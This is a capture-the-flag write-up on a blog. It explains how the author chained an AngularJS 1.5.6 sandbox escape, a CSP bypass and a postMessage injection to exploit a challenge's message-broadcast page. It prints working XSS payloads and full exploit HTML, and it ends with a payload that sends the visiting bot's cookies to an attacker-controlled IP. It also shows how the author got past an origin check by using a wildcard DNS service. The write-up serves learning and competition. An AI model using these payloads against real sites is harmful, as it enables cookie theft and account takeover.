---
title: STF [You shall not pass!]
author: Jason Chua (Coldspot)
date: 2020-12-08 00:00:51 +0800
categories: [CTF, STF]
tags: [sandbox, tech, angular, xss]
toc: true
comments: true
---

*3 SOLVES*

*DESCRIPTION*


We discovered a web portal used by COViD as a C2 platform to send messages to his ransomware victims. They have a script that accesses and hacks the websites posted back to the server! Can you stop them?

<!--more-->

# Initial Testing
Accessing the web site at [http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/](http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/) will lead us to a simple page shown below.

![upload-image](/assets/img/blog/STF-You-shall-not-pass!/1.png)

Attempting to broadcast a message will pop up a jQuery-based on-screen-keyboard which can be found at [github](https://github.com/chriscook/on-screen-keyboard) 
![upload-image](/assets/img/blog/STF-You-shall-not-pass!/2.png)
![upload-image](/assets/img/blog/STF-You-shall-not-pass!/3.png)

Broadcasting a message will display the broadcasted text in the embedded iframe which leads to `/broadcasts`.  
![upload-image](/assets/img/blog/STF-You-shall-not-pass!/4.png)

Entering a URL into the text box for  `Add new website to hack!` will result in the server sending a GET request to the specified URL.

![upload-image](/assets/img/blog/STF-You-shall-not-pass!/5.png)
![upload-image](/assets/img/blog/STF-You-shall-not-pass!/6.png)

2 other script tag can be found. `script.js` leads to a `404 Not Found` and a copy of Angular v1.5.6 is included.
![upload-image](/assets/img/blog/STF-You-shall-not-pass!/7.png)

`/broadcasts` contains a JavaScript file called `frame.js` which will be critical in developing of the exploit.
![upload-image](/assets/img/blog/STF-You-shall-not-pass!/8.png)

Iframes to the website can also be included in a web server on a different domain indicated by the lack of an `X-Frame-Options` header

![upload-image](/assets/img/blog/STF-You-shall-not-pass!/9.png)

# Discovering and planning of exploit

Attempting to inject JavaScript `<img/src/onerror=alert()>` in the broadcast field will result in `Refused to execute inline event handler because it violates the following Content Security Policy directive: "script-src 'unsafe-eval' 'self'". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution.` in the console log.  

The key-points derived from the error is that the `unsafe-eval` in `script-src` directive is set to `self` which only allows the use of `eval()` in the same origin as the target site.

The initial plan of action is to post arbitrary JavaScript on `/broadcasts` page and enter the link of `/broadcasts` in the `Add new website to hack!` form. However, one issue is that the XSS is not stored. As such, having the server attempt a GET request on `/broadcasts` page will not execute said JavaScript. 

![upload-image](/assets/img/blog/STF-You-shall-not-pass!/10.png)

A solution to the above problem will be having the target server attempt a GET request to a web server that we own. Our web server will then include an iframe to the `/broadcasts` target URL and attempt to run the `postMessage()` function to send our payload to the `/broadcasts` endpoint which has a `receiveMessage()` function.

The payload should consist an iframe which contains a script tag that loads the angular script as well as a completed angular sandbox escape as well as CSP-bypassed code which runs arbitrary JavaScript, which had not been completed at this stage.

![upload-image](/assets/img/blog/STF-You-shall-not-pass!/11.png)

After a long time searching (and missing the obvious payload), I decided on a payload shown in a GitHub repository [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md). 

```javascript
a=toString().constructor.prototype;a.charAt=a.trim;
$eval('a,eval(`var _=document.createElement(\'script\');_.src=\'//localhost/m\';document.body.appendChild(_);`),a')
```

This payload is ideal as it consists of the least number of bad characters as predetermined by `/broadcasts/frame.js`.

The adapted payload will have the script construct a string by reading in decimal values and converting it to ASCII from its ordinal value.

```javascript
a=toString().constructor.prototype;a.charAt=a.trim;$eval(toString().constructor.fromCharCode(97,44,97,108,101,114,116,40,34,67,79,76,68,83,80,79,84,34,41,44,97))
```

To test the script locally, download the vulnerable Angular source code from the challenge website and place it in a `javascripts` folder. Next, create an `index.html` page in the root folder
```html
<html>
  <iframe id="xss"></iframe>
</html>

<script>
  setTimeout(function(){
    const frame = document.createElement('iframe')
    const inject = document.getElementById("xss")
    frame.srcdoc = `<script/src=/javascripts/angular.min.js><\/script><div/ng-app>{{a=toString().constructor.prototype;a.charAt=a.trim;$eval(toString().constructor.fromCharCode(97,44,97,108,101,114,116,40,34,67,79,76,68,83,80,79,84,34,41,44,97))}}</div>`
    document.body.innerHTML = frame.outerHTML.replace(" ", "/")

    inject.src = "http://localhost"
  },
  1000)
</script>
```
The result should be something like this:


![upload-image](/assets/img/blog/STF-You-shall-not-pass!/12.png)

Assuming you have [python](https://www.python.org/) installed, run the following command in the root directory in a command prompt and open up `http://localhost` on a web browser

Python 3+
```bash
python -m http.server 80
```
Python 2+
```bash
python -m SimpleHTTPServer 80
```

The following picture should be the outcome:
![upload-image](/assets/img/blog/STF-You-shall-not-pass!/13.png)

To make sure the exploit works for the server, add an `onload` function to inject to run `postMessage(frame.outerHTML)` and change inject.src to `http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/broadcasts`. 

```html
<html>
	<iframe id="xss"></iframe>
</html>

<script>
	
	const frame = document.createElement('iframe')
	const inject = document.getElementById("xss")
	frame.srcdoc = `<script/src=/javascripts/angular.min.js><\/script><div/ng-app>{{a=toString().constructor.prototype;a.charAt=a.trim;$eval(toString().constructor.fromCharCode(97,44,97,108,101,114,116,40,34,67,79,76,68,83,80,79,84,34,41,44,97))}}</div>`

	inject.onload = _ => {
		inject.contentWindow.postMessage(frame.outerHTML, "*")
	}

	inject.src = "http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41011/broadcasts"

</script>
```

Hosting it locally and accessing it, you will realize that the page still did not work. No JavaScript alert ☹
![upload-image](/assets/img/blog/STF-You-shall-not-pass!/14.png)

There are 2 main reasons why this script did not work. First, the payload that was sent to the server contains blacklisted characters, and second, the URL did not pass the origin check on the server.

# Fixing of exploit

To fix the first issue of our payload having blacklisted character(s), we must first identify where did the blacklisted character(s) appear. We can first check the payload that was sent with the `postMessage()` function, which was `frame.outerHTML`.

![upload-image](/assets/img/blog/STF-You-shall-not-pass!/15.png)

As we can see, the payload contained a " " character after iframe which was blocked in `/broadcasts/frame.js`. To circumvent this, I used a `.replace(“ “, “/”)` for the outerHTML.

The second problem lies with the origin check. Recall that in `/broadcasts/frame.js`, there is a check for the `event.origin`

![upload-image](/assets/img/blog/STF-You-shall-not-pass!/16.png)

This Regular Expression check if `event.origin` begins with  `yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg` and will return if the check fails. As such, we need a DNS to point to our server, starting with `yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg`. [xip](http://xip.io/) provide a free domain name that points to any IP address. The domain name we will use is `yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg.<IPADDRESS>.xip.io`. 

# Finishing up

Finally, the payload will be changed from `a, alert(“COLDSPOT”),a` to `a,document.location = "http://<IPADDRESS>/" + document.cookie,a`. Finally, port forward and retrieve your IP address and replace <IPADDRESS> with your own IP address.

Entering `yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg.<IPADDRESS>.xip.io` into `Add new website to hack` form will cause the server to request a URL on our local server with the flag as the filename. 

![upload-image](/assets/img/blog/STF-You-shall-not-pass!/17.png)

# Thoughts

On the CTF day itself, I did not want to mess with port forwarding as many ports from my device were open and vulnerable. As such, I used a $5/month droplet on DigitalOcean and my own domain name `coldspot.me`. 

The grand total for the server cost can be seen in the picture below:
![upload-image](/assets/img/blog/STF-You-shall-not-pass!/18.png)


More info 
>> Ask me on Discord @Coldspot#7033
